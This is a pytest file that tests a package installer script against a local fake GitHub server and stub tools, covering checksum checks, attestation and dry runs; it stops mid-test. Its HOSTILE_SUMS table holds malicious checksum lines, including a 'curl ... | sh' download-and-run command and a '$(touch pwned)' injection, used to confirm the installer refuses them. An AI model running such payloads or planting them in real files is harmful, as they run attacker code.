"""install.sh, run against a local server that plays GitHub and stub uv, pipx and gh.

Nothing here reaches the network or installs anything: the script's base URL points at a server on
127.0.0.1, HOME and TMPDIR are temporary directories, and PATH holds only the stubs and the few
system tools the script is allowed to use.
"""

from __future__ import annotations

import hashlib
import os
import re
import shlex
import shutil
import socketserver
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from test_docs_links import anchors, broken_links

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "install.sh"
README = ROOT / "README.md"

SH = "/bin/sh"
SHELLS = [SH] + [path for name in ("dash", "bash") if (path := shutil.which(name))]

# Every external command install.sh may run, besides uv, pipx, gh, python and contexto. A command
# outside this list is "not found" under the test PATH, so the list is checked by every test.
SCRIPT_TOOLS = ("curl", "mktemp", "rm", "awk", "cat")
SHA_TOOLS = ("sha256sum", "shasum")
STUB_TOOLS = ("basename", "mkdir", "cp", "ln")

UV_STUB = r"""#!/bin/sh
echo "uv $*" >> "$STUB_STATE/calls.log"
bin=$STUB_BIN
case "${1-} ${2-}" in
"tool list")
    for f in "$STUB_STATE"/uv/*; do
        [ -e "$f" ] || continue
        echo "$(basename "$f") v$(cat "$f")"
        echo "- contexto"
    done ;;
"tool dir") echo "$bin" ;;
"tool run")
    # uv tool run --python X --from WHEEL contexto --version: runs the wheel, installs nothing.
    [ -z "${STUB_TRIAL_FAIL-}" ] || { echo "error: stub trial failure" >&2; exit 2; }
    while [ "$1" != --from ]; do shift; done
    name=$(basename "$2"); v=${name#contexto_proxy-}; v=${v#contexto-}
    echo "contexto ${STUB_TRIAL_VERSION:-${v%%-*}}" ;;
"tool uninstall")
    [ -e "$STUB_STATE/uv/$3" ] || { echo "error: \`$3\` is not installed" >&2; exit 2; }
    rm "$STUB_STATE/uv/$3"
    # Measured with uv 0.13.5: uninstall removes the executable whichever tool owns it now.
    rm -f "$bin/contexto" "$STUB_STATE/owner" ;;
"tool install")
    shift 2; force=0; wheel=
    while [ $# -gt 0 ]; do
        case $1 in --force) force=1 ;; --python) shift ;; *) wheel=$1 ;; esac
        shift
    done
    [ -f "$wheel" ] || { echo "error: no wheel at $wheel" >&2; exit 2; }
    [ -z "${STUB_INSTALL_FAIL-}" ] || { echo "error: stub install failure" >&2; exit 2; }
    name=$(basename "$wheel")
    case $name in
        contexto_proxy-*) dist=contexto-proxy; v=${name#contexto_proxy-} ;;
        *) dist=contexto; v=${name#contexto-} ;;
    esac
    v=${v%%-*}
    owner=$(cat "$STUB_STATE/owner" 2>/dev/null || true)
    if [ -e "$bin/contexto" ] && [ "$owner" != "uv:$dist" ] && [ "$force" = 0 ]; then
        echo "error: Executable already exists: contexto (use \`--force\` to overwrite)" >&2
        exit 2
    fi
    mkdir -p "$STUB_STATE/uv" "$bin"
    cp "$wheel" "$STUB_STATE/installed.whl"
    echo "$v" > "$STUB_STATE/uv/$dist"
    ln -sf "$STUB_CONTEXTO" "$bin/contexto"
    echo "$v" > "$bin/contexto.version"
    echo "uv:$dist" > "$STUB_STATE/owner" ;;
*) echo "uv stub: unexpected arguments: $*" >&2; exit 2 ;;
esac
"""

PIPX_STUB = r"""#!/bin/sh
echo "pipx $*" >> "$STUB_STATE/calls.log"
bin=$STUB_BIN
case "${1-}" in
list)
    for f in "$STUB_STATE"/pipx/*; do
        [ -e "$f" ] || continue
        echo "$(basename "$f") $(cat "$f")"
    done ;;
environment)
    [ -z "${STUB_PIPX_NO_ENVIRONMENT-}" ] || { echo "pipx: unknown command" >&2; exit 2; }
    case "${3-}" in
        PIPX_DEFAULT_PYTHON) echo "$STUB_PIPX_PYTHON" ;;
        PIPX_BIN_DIR) echo "$bin" ;;
        PIPX_LOCAL_VENVS) echo "$STUB_STATE/pipx-venvs" ;;
        *) exit 2 ;;
    esac ;;
run)
    # pipx run [--python X] --no-cache --spec WHEEL contexto --version: installs nothing.
    [ -z "${STUB_TRIAL_FAIL-}" ] || { echo "stub trial failure" >&2; exit 1; }
    shift; python=; spec=
    while [ $# -gt 0 ]; do
        case $1 in --python) python=$2; shift ;; --spec) spec=$2; shift ;; esac
        shift
    done
    # Like real pipx: with no --python it uses its default, and the wheel refuses one before 3.12.
    [ -n "$python" ] || "$STUB_PIPX_PYTHON" || { echo "requires a different Python: needs >=3.12" >&2; exit 1; }
    name=$(basename "$spec"); v=${name#contexto_proxy-}; v=${v#contexto-}
    echo "contexto ${STUB_TRIAL_VERSION:-${v%%-*}}" ;;
uninstall)
    [ -e "$STUB_STATE/pipx/$2" ] || { echo "Nothing to uninstall for $2" >&2; exit 1; }
    rm "$STUB_STATE/pipx/$2"
    rm -rf "$STUB_STATE/pipx-venvs/$2"
    # Measured with pipx 1.18.4: uninstall leaves a link that another install owns.
    if [ "$(cat "$STUB_STATE/owner" 2>/dev/null || true)" = "pipx:$2" ]; then
        rm -f "$bin/contexto" "$STUB_STATE/owner"
    fi ;;
install)
    shift; force=0; wheel=; python=
    while [ $# -gt 0 ]; do
        case $1 in --force) force=1 ;; --python) python=$2; shift ;; *) wheel=$1 ;; esac
        shift
    done
    [ -f "$wheel" ] || { echo "no wheel at $wheel" >&2; exit 1; }
    [ -n "$python" ] || "$STUB_PIPX_PYTHON" || { echo "requires a different Python: needs >=3.12" >&2; exit 1; }
    [ -z "${STUB_INSTALL_FAIL-}" ] || { echo "stub install failure" >&2; exit 1; }
    name=$(basename "$wheel")
    case $name in
        contexto_proxy-*) dist=contexto-proxy; v=${name#contexto_proxy-} ;;
        *) dist=contexto; v=${name#contexto-} ;;
    esac
    v=${v%%-*}
    mkdir -p "$STUB_STATE/pipx" "$bin"
    # Measured with pipx 1.18.4: both of these leave the old command in place and exit 0.
    if [ -e "$STUB_STATE/pipx/$dist" ] && [ "$force" = 0 ]; then
        echo "'$dist' already seems to be installed. Not modifying existing installation"
        exit 0
    fi
    cp "$wheel" "$STUB_STATE/installed.whl"
    echo "$v" > "$STUB_STATE/pipx/$dist"
    mkdir -p "$STUB_STATE/pipx-venvs/$dist/bin"
    : > "$STUB_STATE/pipx-venvs/$dist/bin/contexto"
    owner=$(cat "$STUB_STATE/owner" 2>/dev/null || true)
    if [ -e "$bin/contexto" ] && [ "$owner" != "pipx:$dist" ] && [ "$force" = 0 ]; then
        echo "- contexto (symlink missing or pointing to unexpected location)"
        exit 0
    fi
    ln -sf "$STUB_CONTEXTO" "$bin/contexto"
    echo "$v" > "$bin/contexto.version"
    echo "pipx:$dist" > "$STUB_STATE/owner" ;;
*) echo "pipx stub: unexpected arguments: $*" >&2; exit 2 ;;
esac
"""

GH_STUB = r"""#!/bin/sh
echo "gh $*" >> "$STUB_STATE/calls.log"
if [ "${STUB_GH_EXIT:-0}" != 0 ]; then
    echo "gh stub: verification failed" >&2
fi
exit "${STUB_GH_EXIT:-0}"
"""

# The installed command: a link to this file, which prints the version written next to the link.
CONTEXTO_STUB = '#!/bin/sh\necho "contexto $(cat "$0.version")"\n'

STUBS = {
    "uv": UV_STUB,
    "pipx": PIPX_STUB,
    "gh": GH_STUB,
    "contexto": CONTEXTO_STUB,
    "python-new": "#!/bin/sh\nexit 0\n",  # answers the script's version check: 3.12 or later
    "python-old": "#!/bin/sh\nexit 1\n",
    "rm-recorder": '#!/bin/sh\necho "$*" >> "$STUB_STATE/rm.log"\n',  # records, and removes nothing
}


def wheel_name(version: str, dist: str = "contexto") -> str:
    return f"{dist.replace('-', '_')}-{version}-py3-none-any.whl"


def sdist_name(version: str, dist: str = "contexto") -> str:
    return f"{dist.replace('-', '_')}-{version}.tar.gz"


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


class LocalServer(ThreadingHTTPServer):
    """HTTPServer.server_bind looks up the host's name with socket.getfqdn, a reverse DNS lookup that
    took 35 seconds on every call with one Python 3.15 build. The name is not used here."""

    def server_bind(self):
        socketserver.TCPServer.server_bind(self)
        self.server_name = "127.0.0.1"
        self.server_port = self.server_address[1]


class Hub:
    """A server on 127.0.0.1 that answers like github.com does for one repository's releases."""

    def __init__(self):
        hub = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                hub.requests.append(self.path)
                if any(part in self.path for part in hub.stall):  # accept, then never answer
                    hub.released.wait(30)
                    return
                status, headers, body = hub.answer(self.path, "http://" + self.headers["Host"])
                if self.path.endswith("/releases/latest") and self.command in hub.refused_on_latest:
                    # The script reads only the redirect, with HEAD. GET is refused, so a switch to
                    # GET, which would download the whole release page, fails the tests.
                    status, headers, body = 405, {"Allow": "HEAD"}, b"Method Not Allowed"
                slow = any(part in self.path for part in hub.drip)
                endless = any(part in self.path for part in hub.endless)
                huge = any(part in self.path for part in hub.huge)
                self.send_response(status)
                for key, value in headers.items():
                    self.send_header(key, value)
                if not (endless or huge):
                    self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if self.command == "HEAD":
                    return
                try:
                    if slow:  # a byte every fifth of a second
                        for index in range(len(body)):
                            self.wfile.write(body[index:index + 1])
                            self.wfile.flush()
                            if hub.released.wait(0.2):
                                return
                    elif endless:  # no Content-Length, and far more than any limit
                        for _ in range(128):
                            self.wfile.write(b"a" * 65536)
                    elif huge:  # no Content-Length, 160 MB at once, then a stall
                        chunk = b"a" * 1048576
                        for _ in range(160):
                            self.wfile.write(chunk)
                        self.wfile.flush()
                        hub.released.wait(60)
                    else:
                        self.wfile.write(body)
                except OSError:
                    pass  # the client gave up, which is the point

            do_HEAD = do_GET

        self.server = LocalServer(("127.0.0.1", 0), Handler)
        self.root = f"http://127.0.0.1:{self.server.server_address[1]}"
        self.url = self.root + "/owner/repo"
        self.released = threading.Event()
        self.reset()
        threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True).start()

    def reset(self):
        """Forget every release and request, and let go of any connection a test left stalled."""
        self.released.set()
        self.released = threading.Event()
        self.releases: dict[str, dict[str, bytes]] = {}
        self.latest: str | None = None
        self.latest_target: str | None = None  # where /releases/latest redirects, when not to `latest`
        self.requests: list[str] = []
        self.stall: set[str] = set()
        self.drip: set[str] = set()
        self.endless: set[str] = set()
        self.huge: set[str] = set()
        self.refused_on_latest = {"GET"}

    def answer(self, path: str, origin: str):
        base = "/owner/repo"
        if path == base + "/releases/latest":
            # GitHub answers 302 to the tag page, or to the release list when there is no release.
            target = f"{origin}{base}/releases/tag/{self.latest}" if self.latest else f"{origin}{base}/releases"
            if self.latest_target:
                target = self.latest_target.format(origin=origin, base=origin + base)
            return 302, {"Location": target}, b""
        if path == base + "/releases" or "/releases/tag/" in path:
            return 200, {"Content-Type": "text/html"}, b"<html>release page</html>"
        download = re.fullmatch(re.escape(base) + r"/releases/download/([^/]+)/([^/]+)", path)
        if download and download[2] in self.releases.get(download[1], {}):
            # GitHub redirects an asset download to another host; here, to another path.
            return 302, {"Location": f"{origin}/blob/{download[1]}/{download[2]}"}, b""
        blob = re.fullmatch(r"/blob/([^/]+)/([^/]+)", path)
        if blob and blob[2] in self.releases.get(blob[1], {}):
            return 200, {"Content-Type": "application/octet-stream"}, self.releases[blob[1]][blob[2]]
        return 404, {"Content-Type": "text/plain"}, b"Not Found"

    def add(self, version: str, dist: str = "contexto", *, sums: str | None | bool = True, latest: bool = True):
        """Publish a release. `sums` is True for the real file, False for none, or the file's text."""
        wheel = f"wheel bytes of {dist} {version}".encode()
        sdist = f"sdist bytes of {dist} {version}".encode()
        assets = {wheel_name(version, dist): wheel, sdist_name(version, dist): sdist}
        if sums is True:
            sums = "".join(f"{sha256(data)}  {name}\n" for name, data in sorted(assets.items()))
        if sums is not False:
            assets["SHA256SUMS"] = sums.encode()
        self.releases[f"v{version}"] = assets
        if latest:
            self.latest = f"v{version}"
        return wheel

    def downloads(self, suffix: str) -> list[str]:
        return [path for path in self.requests if path.startswith("/owner/repo/releases/download/") and
                path.endswith(suffix)]

    def close(self):
        self.released.set()
        self.server.shutdown()
        self.server.server_close()


class Box:
    """One machine as install.sh sees it: a PATH of stubs, a home directory, and a fake GitHub."""

    def __init__(self, tmp: Path, hub: Hub, stub_files: dict[str, Path], *, tools=("uv", "pipx", "gh"),
                 sha=SHA_TOOLS):
        self.hub = hub
        self.stub_files = stub_files
        self.home = tmp / "home"
        self.state = tmp / "state"
        self.bin = tmp / "tool-bin"
        self.stubs = tmp / "stubs"
        self.system = tmp / "system"
        self.tmpdir = tmp / "tmp"
        for path in (self.home, self.state, self.bin, self.stubs, self.system, self.tmpdir):
            path.mkdir()
        (self.home / ".contexto").mkdir()
        (self.home / ".contexto" / "session.json").write_text("kept")
        for name in (*SCRIPT_TOOLS, *STUB_TOOLS):
            self.link_system(name)
        linked = [name for name in sha if self.link_system(name, required=False)]
        assert linked or not sha, "the test machine has neither sha256sum nor shasum"
        for name in tools:
            self.stub(name, name)
        self.old_python = stub_files["python-old"]
        self.new_python = stub_files["python-new"]
        self.env = {
            "PATH": os.pathsep.join(map(str, (self.bin, self.stubs, self.system))),
            "HOME": str(self.home),
            "TMPDIR": str(self.tmpdir),
            "CONTEXTO_INSTALL_BASE_URL": hub.url,
            "STUB_STATE": str(self.state),
            "STUB_BIN": str(self.bin),
            "STUB_CONTEXTO": str(stub_files["contexto"]),
            "STUB_PIPX_PYTHON": str(self.new_python),
        }

    def link_system(self, name: str, required: bool = True) -> bool:
        found = shutil.which(name)
        if not found:
            assert not required, f"{name} is needed by the tests and is not on PATH"
            return False
        (self.system / name).symlink_to(found)
        return True

    def stub(self, name: str, kind: str) -> Path:
        """Put one of the shared stub files on PATH under `name`."""
        path = self.stubs / name
        path.symlink_to(self.stub_files[kind])
        return path

    def command(self, version: str):
        """A `contexto` command in the tools' bin directory that reports that version."""
        link = self.bin / "contexto"
        if not link.is_symlink():
            link.symlink_to(self.stub_files["contexto"])
        (self.bin / "contexto.version").write_text(version + "\n")

    def preinstall(self, tool: str, dist: str, version: str, command: str = "contexto"):
        """The state a real `uv tool install` or `pipx install` of that release leaves behind.

        With another `command`, the package only shares the name: it provides no `contexto`."""
        (self.state / tool).mkdir(exist_ok=True)
        (self.state / tool / dist).write_text(version + "\n")
        if tool == "pipx":
            venv_bin = self.state / "pipx-venvs" / dist / "bin"
            venv_bin.mkdir(parents=True)
            (venv_bin / command).write_text("")
        if command == "contexto":
            self.command(version)
            (self.state / "owner").write_text(f"{tool}:{dist}\n")

    def edited_script(self, *edits: tuple[str, str]) -> Path:
        """A copy of install.sh with each (old, new) applied exactly once."""
        text = SCRIPT.read_text()
        for old, new in edits:
            assert text.count(old) == 1, old
            text = text.replace(old, new)
        copy = self.state / "install-edited.sh"
        copy.write_text(text)
        return copy

    def run(self, *args: str, shell: str = SH, how: str = "path", script: Path = SCRIPT, **env: str):
        full_env = {**self.env, **env}
        if how == "path":
            return subprocess.run([shell, str(script), *args], env=full_env, capture_output=True, text=True,
                                  stdin=subprocess.DEVNULL, timeout=60)
        command = [shell, "-s", "--", *args] if args else [shell]
        if how == "stdin":  # sh < install.sh
            with open(script, "rb") as source:
                return subprocess.run(command, env=full_env, capture_output=True, text=True, stdin=source,
                                      timeout=60)
        assert how == "pipe"  # cat install.sh | sh
        cat = subprocess.Popen(["cat", str(script)], stdout=subprocess.PIPE)
        try:
            return subprocess.run(command, env=full_env, capture_output=True, text=True, stdin=cat.stdout,
                                  timeout=60)
        finally:
            cat.stdout.close()
            cat.wait()

    def calls(self) -> list[str]:
        log = self.state / "calls.log"
        return log.read_text().splitlines() if log.exists() else []

    def changes(self) -> list[str]:
        """The stub calls that install or remove something, in order."""
        return [call for call in self.calls()
                if call.startswith(("uv tool install", "uv tool uninstall", "pipx install", "pipx uninstall"))]

    def installed(self) -> dict[str, str]:
        found = {}
        for tool in ("uv", "pipx"):
            for path in sorted((self.state / tool).glob("*")) if (self.state / tool).is_dir() else ():
                found[f"{tool}:{path.name}"] = path.read_text().strip()
        return found

    def command_version(self) -> str | None:
        command = self.bin / "contexto"
        if not command.exists():
            return None
        return subprocess.run([str(command), "--version"], env=self.env, capture_output=True,
                              text=True).stdout.strip()

    def assert_untouched(self):
        """No install or uninstall ran, no temporary directory is left, session data is as it was."""
        assert self.changes() == []
        assert list(self.tmpdir.iterdir()) == []
        assert (self.home / ".contexto" / "session.json").read_text() == "kept"
        assert sorted(path.name for path in self.home.iterdir()) == [".contexto"]


@pytest.fixture(scope="module")
def shared_hub():
    server = Hub()
    yield server
    server.close()


@pytest.fixture
def hub(shared_hub):
    """One server for the whole file, empty at the start of each test."""
    shared_hub.reset()
    yield shared_hub
    shared_hub.released.set()


@pytest.fixture(scope="session")
def stub_files(tmp_path_factory) -> dict[str, Path]:
    """The stub executables, written once: macOS checks every new executable the first time it runs,
    which costs a few tenths of a second each, so the tests link these and never write their own."""
    directory = tmp_path_factory.mktemp("install-stubs")
    files = {}
    for name, text in STUBS.items():
        files[name] = directory / name
        files[name].write_text(text)
        files[name].chmod(0o755)
    return files


@pytest.fixture
def make_box(tmp_path, hub, stub_files):
    def make(**kwargs) -> Box:
        return Box(tmp_path, hub, stub_files, **kwargs)

    return make


@pytest.fixture
def box(make_box) -> Box:
    return make_box()


def ok(result: subprocess.CompletedProcess) -> subprocess.CompletedProcess:
    assert result.returncode == 0, f"exit {result.returncode}\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}"
    return result


def failed(result: subprocess.CompletedProcess, *needles: str) -> subprocess.CompletedProcess:
    assert result.returncode != 0, f"expected a failure\nstdout:\n{result.stdout}\nstderr:\n{result.stderr}"
    for needle in needles:
        assert needle in result.stderr, f"{needle!r} not in stderr:\n{result.stderr}"
    return result


# --- Finding and installing a release ---


@pytest.mark.parametrize("shell", SHELLS)
def test_latest_release_is_found_verified_and_installed_with_uv(box, shell):
    wheel = box.hub.add("1.2.3")
    result = ok(box.run(shell=shell))
    assert "Latest release: v1.2.3" in result.stdout
    assert "Verified contexto-1.2.3-py3-none-any.whl" in result.stdout
    assert sha256(wheel) in result.stdout
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"
    changes = box.changes()
    assert len(changes) == 1 and changes[0].startswith("uv tool install --python >=3.12 ")
    assert changes[0].endswith("/contexto-1.2.3-py3-none-any.whl")
    assert (box.state / "installed.whl").read_bytes() == wheel
    assert box.installed() == {"uv:contexto": "1.2.3"}
    assert list(box.tmpdir.iterdir()) == [], "the temporary directory is removed on exit"
    assert box.hub.requests[0] == "/owner/repo/releases/latest"


def test_the_wheel_is_installed_from_a_private_temporary_directory(box):
    box.hub.add("1.2.3")
    ok(box.run())
    wheel_path = Path(box.changes()[0].split()[-1])
    assert wheel_path.parent.parent == box.tmpdir
    assert wheel_path.parent.name.startswith("contexto-install.")


def test_pipx_is_used_when_uv_is_absent(make_box):
    box = make_box(tools=("pipx", "gh"))
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert box.changes() == [f"pipx install {box.tmpdir}/{_tmp_name(box)}/contexto-1.2.3-py3-none-any.whl"]
    assert box.installed() == {"pipx:contexto": "1.2.3"}
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.3"


def _tmp_name(box: Box) -> str:
    """The script's temporary directory name, read back from the install call."""
    return Path(box.changes()[-1].split()[-1]).parent.name


def test_neither_uv_nor_pipx_installs_nothing_and_says_how_to_get_one(make_box):
    box = make_box(tools=("gh",))
    box.hub.add("1.2.3")
    result = failed(box.run(), "neither uv nor pipx is on PATH", "Nothing was installed",
                    "https://docs.astral.sh/uv/", "https://pipx.pypa.io/")
    assert result.returncode == 1
    box.assert_untouched()
    assert box.hub.requests == [], "nothing is downloaded when nothing can be installed"


@pytest.mark.parametrize("with_tool", ["uv", "pipx"])
def test_with_forces_the_installer(box, with_tool):
    box.hub.add("1.2.3")
    ok(box.run("--with", with_tool))
    assert box.installed() == {f"{with_tool}:contexto": "1.2.3"}


def test_with_a_tool_that_is_missing_or_unknown_fails(make_box):
    box = make_box(tools=("uv",))
    box.hub.add("1.2.3")
    assert failed(box.run("--with", "pipx"), "pipx is not on PATH").returncode == 1
    assert failed(box.run("--with", "pip"), "--with takes uv or pipx").returncode == 2
    box.assert_untouched()


def test_an_existing_pipx_install_is_upgraded_with_pipx_even_when_uv_is_present(box):
    box.preinstall("pipx", "contexto", "1.2.2")
    box.hub.add("1.2.3")
    ok(box.run())
    assert box.installed() == {"pipx:contexto": "1.2.3"}
    assert box.command_version() == "contexto 1.2.3"


@pytest.mark.parametrize("argument", ["v1.2.2", "1.2.2"])
def test_version_option_installs_that_release_not_the_latest(box, argument):
    box.hub.add("1.2.2")
    box.hub.add("1.2.3")
    result = ok(box.run("--version", argument))
    assert box.installed() == {"uv:contexto": "1.2.2"}
    assert "/owner/repo/releases/latest" not in box.hub.requests
    assert result.stdout.rstrip().splitlines()[-1] == "contexto 1.2.2"


def test_version_can_come_from_the_environment_or_an_equals_sign(box):
    box.hub.add("1.2.2")
    box.hub.add("1.2.3")
    ok(box.run(CONTEXTO_VERSION="v1.2.2"))
    assert box.installed() == {"uv:contexto": "1.2.2"}
    ok(box.run("--version=1.2.3", CONTEXTO_VERSION="v1.2.2"))
    assert box.installed() == {"uv:contexto": "1.2.3"}, "the option wins over the environment"


@pytest.mark.parametrize("bad", ["latest", "1.2", "v1.2.3.4", "1.2.x", "v1.2.3/../x", "1..3", "", "1.2.3 4"])
def test_a_version_that_is_not_three_numbers_is_refused(box, bad):
    box.hub.add("1.2.3")
    result = failed(box.run("--version", bad))
    assert result.returncode == 2
    box.assert_untouched()
    assert box.hub.requests == []


def test_a_release_that_does_not_exist_fails_clearly(box):
    box.hub.add("1.2.3")
    failed(box.run("--version", "9.9.9"), "v9.9.9", "SHA256SUMS")
    box.assert_untouched()


def test_no_release_at_all_fails_clearly(box):
    failed(box.run(), "releases/latest")
    box.assert_untouched()


@pytest.mark.parametrize("dist", ["contexto", "contexto-proxy"])
def test_old_and_new_wheel_names_both_install(box, dist):
    wheel = box.hub.add("2.0.0", dist)
    result = ok(box.run())
    assert f"Verified {wheel_name('2.0.0', dist)}" in result.stdout
    assert box.installed() == {f"uv:{dist}": "2.0.0"}
    assert (box.state / "installed.whl").read_bytes() == wheel


# --- The checksum file is untrusted ---


def test_checksum_mismatch_aborts_before_any_install_command(box):
    # The bad release is under the new name, so removing the old install too early would show.
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3", "contexto-proxy")
    name = wheel_name("1.2.3", "contexto-proxy")
    box.hub.releases["v1.2.3"][name] = b"not the bytes the checksum was made from"
    failed(box.run(), "SHA-256 mismatch", "Nothing was installed")
    box.assert_untouched()
    assert box.installed() == {"uv:contexto": "1.2.2"}, "the old install is not removed"
    assert box.command_version() == "contexto 1.2.2"


GOOD = "a" * 64
HOSTILE_SUMS = {
    "path traversal": f"{GOOD}  ../../contexto-1.2.3-py3-none-any.whl\n",
    "absolute path": f"{GOOD}  /tmp/contexto-1.2.3-py3-none-any.whl\n",
    "subdirectory": f"{GOOD}  dist/contexto-1.2.3-py3-none-any.whl\n",
    "wrong version": f"{GOOD}  contexto-1.2.4-py3-none-any.whl\n",
    "wrong version, new name": f"{GOOD}  contexto_proxy-9.0.0-py3-none-any.whl\n",
    "two wheels": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n{GOOD}  contexto_proxy-1.2.3-py3-none-any.whl\n",
    "same wheel twice": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n{'b' * 64}  contexto-1.2.3-py3-none-any.whl\n",
    "extra line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n{GOOD}  evil.sh\n",
    "extra text line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\ncurl https://example.invalid | sh\n",
    "blank line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n\n{GOOD}  contexto-1.2.3.tar.gz\n",
    "another platform's wheel": f"{GOOD}  contexto-1.2.3-cp312-cp312-linux_x86_64.whl\n",
    "trailing text after the name": f"{GOOD}  contexto-1.2.3-py3-none-any.whl --force\n",
    "short digest": f"{'a' * 63}  contexto-1.2.3-py3-none-any.whl\n",
    "long digest": f"{'a' * 65}  contexto-1.2.3-py3-none-any.whl\n",
    "digest that is not hex": f"{'g' * 64}  contexto-1.2.3-py3-none-any.whl\n",
    "uppercase digest": f"{'A' * 64}  contexto-1.2.3-py3-none-any.whl\n",
    "one space": f"{GOOD} contexto-1.2.3-py3-none-any.whl\n",
    "binary marker": f"{GOOD} *contexto-1.2.3-py3-none-any.whl\n",
    "carriage return": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\r\n",
    "no wheel": f"{GOOD}  contexto-1.2.3.tar.gz\n",
    "empty": "",
    "html": "<html><body>Sign in</body></html>\n",
    "shell metacharacters": f"{GOOD}  $(touch pwned)\n",
    "glob": f"{GOOD}  *\n",
    "NUL after the name": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\x00\n",
    "NUL inside the name": f"{GOOD}  contexto-1.2.3-py3\x00-none-any.whl\n",
    "NUL on its own line": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n\x00\n",
    "a byte that is not ASCII": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n\u00e9\n",
    "escape sequence": f"{GOOD}  contexto-1.2.3-py3-none-any.whl\n\x1b[31m\n",
}


@pytest.mark.parametrize("case", sorted(HOSTILE_SUMS))
def test_a_hostile_checksum_file_is_refused(box, case, tmp_path):
    box.hub.add("1.2.3", sums=HOSTILE_SUMS[case])
    result = failed(box.run(), "SHA256SUMS", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.downloads(".whl") == [], "no wheel is downloaded on the word of a bad checksum file"
    assert "evil" not in result.stderr and "curl https" not in result.stderr, "untrusted lines are not echoed"
    assert not list(tmp_path.rglob("pwned"))


def test_the_real_checksum_file_form_is_accepted_without_a_final_newline(box):
    wheel = box.hub.add("1.2.3", sums=False)
    name = wheel_name("1.2.3")
    box.hub.releases["v1.2.3"]["SHA256SUMS"] = f"{sha256(wheel)}  {name}".encode()
    ok(box.run())
    assert box.installed() == {"uv:contexto": "1.2.3"}


def test_a_release_without_checksums_stops_and_names_the_oldest_release_that_has_them(box):
    box.hub.add("1.2.3", sums=False)
    failed(box.run(), "SHA256SUMS", "v0.5.13", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.downloads(".whl") == []


def test_a_release_older_than_the_first_with_checksums_stops_before_any_download(box):
    box.hub.add("0.5.12", sums=False)
    failed(box.run("--version", "0.5.12"), "v0.5.12 has no SHA256SUMS", "v0.5.13")
    box.assert_untouched()
    assert box.hub.requests == []


def test_no_checksum_tool_stops_the_install(make_box):
    box = make_box(sha=())
    box.hub.add("1.2.3")
    failed(box.run(), "sha256sum", "shasum", "Nothing was installed")
    box.assert_untouched()


@pytest.mark.parametrize("tool", SHA_TOOLS)
def test_either_checksum_tool_alone_is_enough(make_box, tool):
    if not shutil.which(tool):
        pytest.skip(f"{tool} is not on PATH")
    box = make_box(sha=(tool,))
    box.hub.add("1.2.3")
    ok(box.run())
    assert box.installed() == {"uv:contexto": "1.2.3"}


# --- --dry-run, --attest, --help ---


@pytest.mark.parametrize("shell", SHELLS)
def test_dry_run_prints_the_plan_and_changes_nothing(box, shell):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3", "contexto-proxy")
    result = ok(box.run("--dry-run", shell=shell))
    box.assert_untouched()
    assert box.hub.downloads(".whl") == [], "a dry run does not download the wheel"
    out = result.stdout
    assert "Dry run" in out
    assert f"{box.hub.url}/releases/download/v1.2.3/contexto_proxy-1.2.3-py3-none-any.whl" in out
    assert "Would run: uv tool uninstall contexto" in out
    assert "Would run: uv tool install" in out
    assert out.index("Would run: uv tool run") < out.index("uv tool uninstall contexto") < out.index("uv tool install")
    assert box.installed() == {"uv:contexto": "1.2.2"}
    assert box.command_version() == "contexto 1.2.2"


def test_dry_run_with_attest_names_the_check_and_does_not_run_it(box):
    box.hub.add("1.2.3")
    result = ok(box.run("--dry-run", "--attest"))
    assert "gh attestation verify" in result.stdout
    assert not [call for call in box.calls() if call.startswith("gh ")]
    box.assert_untouched()


def test_attest_passes_and_is_checked_before_the_install(box):
    box.hub.add("1.2.3")
    result = ok(box.run("--attest"))
    calls = [call for call in box.calls() if call.startswith(("gh ", "uv tool install"))]
    assert len(calls) == 2
    assert re.fullmatch(r"gh attestation verify \S+/contexto-1\.2\.3-py3-none-any\.whl --repo VentureForgre/contexto",
                        calls[0])
    assert calls[1].startswith("uv tool install")
    assert "Attestation verified" in result.stdout


def test_attest_failing_stops_before_any_install_command(box):
    box.preinstall("uv", "contexto", "1.2.2")
    box.hub.add("1.2.3", "contexto-proxy")
    failed(box.run("--attest", STUB_GH_EXIT="1"), "attestation", "Nothing was installed",
           "gh stub: verification failed")
    box.assert_untouched()
    assert box.installed() == {"uv:contexto": "1.2.2"}


def test_attest_without_gh_stops_before_any_download(make_box):
    box = make_box(tools=("uv", "pipx"))
    box.hub.add("1.2.3")
    failed(box.run("--attest"), "--attest needs gh", "Nothing was installed")
    box.assert_untouched()
    assert box.hub.requests == []


def test_without_attest_the_way_to_check_the_attestation_is_printed(box):
    box.hub.add("1.2.3")
    result = ok(box.run())
    assert not [call for call in box.calls() if call.startswith("gh ")]
    # Every test sets a base URL, and with one set the hint must check the file that was installed:
    # the script again with --attest, not a second download from GitHub.
    assert "run this script again with --attest" in result.stdout
    assert "gh release download" not in result.stdout
    assert "gh release download $tag --repo $repo" in SCRIPT.read_text(), "the hint for the default base"


def test_help_documents_every_option_and_variable_and_runs_nothing(box):
    result = ok(box.run("--help"))
    for word in ("--version", "--with", "--attest", "--force", "--dry-run", "--help", "CONTEXTO_VERSION",
